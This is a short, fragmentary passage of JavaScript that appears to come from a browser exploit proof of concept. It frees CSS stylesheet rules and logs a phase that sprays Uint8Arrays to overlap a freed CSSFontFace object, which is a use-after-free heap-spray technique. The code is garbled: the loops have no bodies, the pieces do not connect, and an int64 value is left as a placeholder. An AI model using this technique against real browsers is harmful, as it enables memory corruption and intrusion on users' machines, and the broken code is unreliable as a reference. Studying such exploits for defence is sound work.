    document.head.appendChild(st);

    for (let i = 0; i < FLUSH; i++)

    const sheet = document.getElementById("flush").sheet;
    while (sheet.cssRules.length)

    forceStyle();

    log("[*] Phase 2: Spraying Uint8Arrays to overlap freed CSSFontFace...");

            return new int64(0, 0); // Placeholder

    };
